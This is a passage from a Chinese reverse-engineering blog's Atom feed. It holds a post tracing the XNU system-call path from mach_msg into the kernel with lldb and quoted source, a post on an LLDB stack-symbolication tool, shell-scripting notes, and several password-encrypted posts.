Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-07-18T07:50:52.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p><a href="http://wangchujiang.com/linux-command/c/crontab.html" target="_blank" rel="external">http://wangchujiang.com/linux-command/c/crontab.html</a></p><p>默认日志路径:<code>/var/mail/Username</code></p><p>修改邮件接收地址：<code>MAILTO=939xxxx983@qq.com</code></p><p>日志重定向：<code>* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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